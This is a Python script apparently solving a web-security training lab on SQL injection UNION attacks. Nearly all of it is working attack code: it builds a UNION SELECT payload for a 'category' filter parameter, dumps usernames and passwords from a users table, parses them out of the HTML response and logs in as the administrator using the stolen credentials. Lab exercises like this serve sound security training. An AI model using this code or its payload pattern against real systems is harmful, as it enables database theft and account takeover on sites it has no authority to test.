#!/usr/bin/env python3
"""SQL injection UNION attack, retrieving data from other tables"""

from typing import NamedTuple

import bs4
import requests

import lab_04


class Lab(lab_04.Lab):
    """Wrapper"""

    User = NamedTuple("User", [("name", str), ("password", str)])

    def columns_of_string_type(self, table: str = "") -> list[int]:
        """Get which columns are string types"""
        return [i for i in range(self.column_count(table=table))
                if self.column_is_string_type(i, table=table)]

    def dump_table(self, fields: list[str], table: str = "",
                   where: str = "") -> requests.models.Response:
        """Get usernames and passwords"""
        fields_str = ",+".join(fields)
        if table:
            table = f"+FROM+{table}"
        if where:
            where = f"+WHERE+{where}"
        payload = {self.key: f"'+UNION+SELECT+{fields_str}" \
                             f"{table}{where}{self.comment}"}
        payload_str = self._dict_to_str(payload)
        response = self.session.get(self.url + self.path, params=payload_str)
        response.raise_for_status()
        return response

    @staticmethod
    def parse_html_user_table(response_text: str) -> list["Lab.User"]:
        """Parse usernames and passwords from HTML"""
        soup = bs4.BeautifulSoup(response_text, features="lxml")
        table = soup.find("table", attrs={"class": "is-table-longdescription"})
        rows = table.tbody.find_all("tr")
        return [Lab.User(name=row.th.text, password=row.td.text) for row in rows]

    def login(self, username: str, password: str,
              csrf: str | None = None) -> requests.models.Response:
        """Log in"""
        payload = {"username": username, "password": password}
        if csrf is not None:
            payload["csrf"] = csrf
        response = self.session.post(f"{self.url}/login", data=payload)
        response.raise_for_status()
        return response


def main() -> None:
    """Entry point"""
    site = Lab(key="category", path="/filter")
    if site.columns_of_string_type() != [0, 1]:
        raise RuntimeError(f"Expected [0, 1]; got {site.columns_of_string_type()}")
    response = site.dump_table(["username", "password"], "users")
    users = site.parse_html_user_table(response.text)
    admin = next(user for user in users if user.name == "administrator")
    csrf = site.csrf_token("/login")
    response = site.login(admin.name, admin.password, csrf=csrf)
    response.raise_for_status()
    print(response.status_code)


if __name__ == "__main__":
    main()
